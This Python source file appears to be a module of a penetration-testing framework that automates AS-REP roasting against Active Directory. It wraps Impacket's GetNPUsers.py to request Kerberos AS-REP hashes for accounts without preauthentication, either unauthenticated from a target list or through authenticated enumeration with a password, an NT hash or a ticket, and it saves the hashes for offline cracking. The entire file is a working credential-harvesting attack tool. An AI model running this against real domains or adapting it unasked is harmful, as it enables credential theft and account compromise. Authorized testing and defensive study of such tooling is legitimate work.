import os
import re
import shlex
from pathlib import Path
from uuid import uuid4

from auth_manager import EMPTY_LM_HASH
from module import BaseModule
from tool import Tool


class ASRepRoast(BaseModule):
    path = "kerberos/asreproast"
    description = "Roast AS-REP hashes with optional authentication."
    options = {
        "dc_ip": {
            "default": "",
            "description": "DC IP. If blank, the domain FQDN is used/resolved.",
            "required": False,
        },
        "dc_host": {
            "default": "",
            "description": "Optional DC hostname override for GetNPUsers.",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Target domain name (FQDN)",
            "required": True,
        },
        "username": {
            "default": "",
            "description": "Auth: Username (required only for authenticated enumeration)",
            "required": False,
        },
        "password": {
            "default": "",
            "description": "Auth: Password or NT hash (required only for NTLM enumeration)",
            "required": False,
        },
        "auth": {
            "default": "",
            "description": "Auth: Type (blank, ntlm, krb)",
            "required": False,
        },
        "target_user": {
            "default": "",
            "description": "Target username(s) to roast without auth (comma/space-separated)",
            "required": False,
        },
        "targets_file": {
            "default": "",
            "description": "Optional local file with one target username per line",
            "required": False,
        },
        "format": {
            "default": "hashcat",
            "description": "Output format for saved AS-REP hashes (hashcat, john)",
            "required": False,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    def validate_options(self) -> bool:
        passed = True

        for opt_name in self.options:
            opt_val, _ = self.get_option_value(opt_name)
            if self.options[opt_name]["required"] and not opt_val:
                self.pane_a.write(
                    f"[red][!] Option `{opt_name}` cannot be empty.[/red]"
                )
                passed = False
                continue

            setattr(self.opts, opt_name, opt_val)

        auth_value = (
            (getattr(self.opts, "auth", "") or "").strip().lower().replace("kerberos", "krb")
        )
        if auth_value:
            if auth_value not in {"ntlm", "krb"}:
                self.pane_a.write(
                    "[red][!] Option `auth` must be blank, `ntlm`, or `krb`.[/red]"
                )
                return False
            self.opts.auth = auth_value

        if auth_value == "ntlm":
            if not self.opts.username:
                self.pane_a.write(
                    "[red][!] Username is required for NTLM authentication.[/red]"
                )
                passed = False
            if not self.opts.password:
                self.pane_a.write(
                    "[red][!] Password or NT hash is required for NTLM authentication.[/red]"
                )
                passed = False

        if auth_value == "krb":
            if not self.opts.username:
                self.pane_a.write(
                    "[red][!] Username is required for Kerberos authentication.[/red]"
                )
                passed = False
            else:
                ticket = Path(self.logs_dir) / f"{self.opts.username.lower()}.ccache"
                if ticket.exists():
                    try:
                        for line in self.describe_ticket(ticket):
                            if line.startswith("[*] End Time") and "(expired)" in line:
                                self.pane_a.write(
                                    f"[red][!] Existing ticket for '{self.opts.username}' is expired. Request a new one before proceeding.[/red]"
                                )
                                passed = False
                                break
                    except Exception as exc:
                        self.pane_a.write(
                            f"[yellow][!] Warning: Could not validate ticket: {exc}[/yellow]"
                        )

        return passed

    def _normalize_target(self, raw_value: str) -> str:
        value = (raw_value or "").strip()
        if not value:
            return ""
        if "/" in value:
            value = value.rsplit("/", 1)[-1]
        if "\\" in value:
            value = value.rsplit("\\", 1)[-1]
        if "@" in value:
            value = value.split("@", 1)[0]
        return value

    def _collect_targets(self) -> list[str] | None:
        targets = []

        raw_target_user = (self.opts.target_user or "").strip()
        if raw_target_user:
            for candidate in re.split(r"[\s,]+", raw_target_user):
                normalized = self._normalize_target(candidate)
                if normalized:
                    targets.append(normalized)

        raw_targets_file = (self.opts.targets_file or "").strip()
        if raw_targets_file:
            targets_path = Path(raw_targets_file).expanduser()
            if not targets_path.is_file():
                self.pane_a.write(
                    f"[red][!] Targets file not found: {raw_targets_file}[/red]"
                )
                return None

            for line in targets_path.read_text(encoding="utf-8").splitlines():
                normalized = self._normalize_target(line)
                if normalized and not normalized.startswith("#"):
                    targets.append(normalized)

        deduped = []
        seen = set()
        for target in targets:
            if target.lower() in seen:
                continue
            seen.add(target.lower())
            deduped.append(target)

        return deduped

    def _validate_runtime_options(self, targets: list[str]) -> bool:
        passed = True

        self.opts.format = (self.opts.format or "").strip().lower()
        if self.opts.format not in {"hashcat", "john"}:
            self.pane_a.write(
                "[red][!] Option `format` must be `hashcat` or `john`.[/red]"
            )
            passed = False

        has_auth = bool((self.opts.auth or "").strip())
        if not has_auth and not targets:
            self.pane_a.write(
                "[red][!] Provide `auth` for authenticated enumeration or set `target_user`/`targets_file` for unauthenticated roasting.[/red]"
            )
            passed = False

        if has_auth and not self.opts.username:
            self.pane_a.write(
                "[red][!] Option `username` is required when `auth` is set.[/red]"
            )
            passed = False

        return passed

    def _build_output_file(self, targets: list[str]) -> Path:
        safe_domain = re.sub(r"[^A-Za-z0-9._-]", "_", self.opts.domain.lower())
        if targets:
            if len(targets) == 1:
                suffix = re.sub(r"[^A-Za-z0-9._-]", "_", targets[0].lower())
            else:
                suffix = f"{len(targets)}targets"
        else:
            suffix = re.sub(r"[^A-Za-z0-9._-]", "_", self.opts.username.lower())

        return Path(self.logs_dir) / f"asreproast_{safe_domain}_{suffix}.txt"

    def _add_common_flags(self, command_parts: list[str], tool: Tool):
        if self.opts.format:
            command_parts += ["-format", self.opts.format]
        if self.opts.dc_ip:
            command_parts += ["-dc-ip", self.opts.dc_ip]

        dc_host = (self.opts.dc_host or getattr(self.opts, "dc_hostname", "")).strip()
        if dc_host:
            command_parts += ["-dc-host", dc_host]

    def _build_targeted_command(
        self, output_file: Path, targets: list[str], tool: Tool
    ) -> tuple[list[str], Path | None]:
        command_parts = [
            "../tools/.bin/GetNPUsers.py",
            "-request",
            "-outputfile",
            str(output_file),
            "-no-pass",
        ]
        self._add_common_flags(command_parts, tool)

        if len(targets) == 1:
            command_parts.append(f"{self.opts.domain}/{targets[0]}")
            return command_parts, None

        temp_targets_file = (
            Path(self.logs_dir) / f"asreproast_targets_{uuid4().hex[:8]}.txt"
        )
        temp_targets_file.write_text("\n".join(targets) + "\n", encoding="utf-8")
        command_parts += ["-usersfile", str(temp_targets_file), f"{self.opts.domain}/"]
        return command_parts, temp_targets_file

    def _build_authenticated_command(
        self, output_file: Path, tool: Tool
    ) -> list[str] | None:
        if not tool.set_auth(from_module=True):
            return None

        command_parts = [
            "../tools/.bin/GetNPUsers.py",
            "-request",
            "-outputfile",
            str(output_file),
        ]
        self._add_common_flags(command_parts, tool)

        if self.opts.auth == "krb":
            command_parts += ["-k", "-no-pass", f"{self.opts.domain}/{self.opts.username}"]
            return command_parts

        if tool.is_nt_hash(self.opts.password):
            command_parts += [
                "-hashes",
                f"{EMPTY_LM_HASH}:{self.opts.password.strip(':')}",
                f"{self.opts.domain}/{self.opts.username}",
            ]
            return command_parts

        command_parts.append(
            f"{self.opts.domain}/{self.opts.username}:{self.opts.password}"
        )
        return command_parts

    async def _run_and_capture(self, command_parts: list[str]) -> list[str]:
        captured = []
        async for line in self.run_command(shlex.join(command_parts), self.pane_b):
            lower = line.lower()
            if line.startswith("$krb5asrep$"):
                line = f"[green]{line}[/green]"
            elif "doesn't have uf_dont_require_preauth set" in lower:
                line = f"[yellow]{line}[/yellow]"
            elif "no entries found" in lower:
                line = f"[yellow]{line}[/yellow]"
            elif "traceback (most recent call last):" in lower:
                line = f"[red]{line}[/red]"

            self.pane_b.write(line)
            captured.append(line)

        return captured

    def _count_hashes(self, output_file: Path) -> int:
        if not output_file.is_file():
            return 0

        return sum(
            1
            for line in output_file.read_text(encoding="utf-8", errors="replace").splitlines()
            if line.startswith("$krb5asrep$")
        )

    def _write_summary(
        self,
        targets: list[str],
        output_file: Path,
        raw_lines: list[str],
    ):
        hash_count = self._count_hashes(output_file)
        raw_output = "\n".join(raw_lines)
        log_path = self.write_unique_log(raw_output, f"asreproast_{self.opts.domain}")

        if log_path:
            self.pane_a.write(f"✓ Saved AS-REP command output to `{log_path.name}`")

        if output_file.is_file():
            self.pane_a.write(f"✓ Saved AS-REP hashes to `{output_file.name}`")

        if hash_count:
            self.pane_a.write(
                f"[green]✓ Captured {hash_count} AS-REP hash line(s).[/green]"
            )
            return

        if targets:
            self.pane_a.write(
                f"[yellow][!] No roastable AS-REP hashes were returned for {len(targets)} requested target(s).[/yellow]"
            )
            return

        self.pane_a.write(
            "[yellow][!] Authenticated enumeration did not return any AS-REP roastable accounts.[/yellow]"
        )

    async def run(self):
        if not self.validate_options():
            return

        targets = self._collect_targets()
        if targets is None or not self._validate_runtime_options(targets):
            return

        tool = Tool(self)
        tool.set_output_pane(self.pane_b)

        os.chdir(self.logs_dir)
        output_file = self._build_output_file(targets)
        output_file.parent.mkdir(parents=True, exist_ok=True)

        temp_targets_file = None
        if targets:
            self.pane_b.write(
                f"[cyan]Step 1: Roast {len(targets)} provided target(s) without domain authentication[/cyan]"
            )
            command_parts, temp_targets_file = self._build_targeted_command(
                output_file, targets, tool
            )
        else:
            self.pane_b.write(
                "[cyan]Step 1: Enumerate roastable accounts with authenticated LDAP and request AS-REP hashes[/cyan]"
            )
            command_parts = self._build_authenticated_command(output_file, tool)
            if not command_parts:
                return

        try:
            lines = await self._run_and_capture(command_parts)
        finally:
            if temp_targets_file is not None:
                temp_targets_file.unlink(missing_ok=True)

        self._write_summary(targets, output_file, lines)
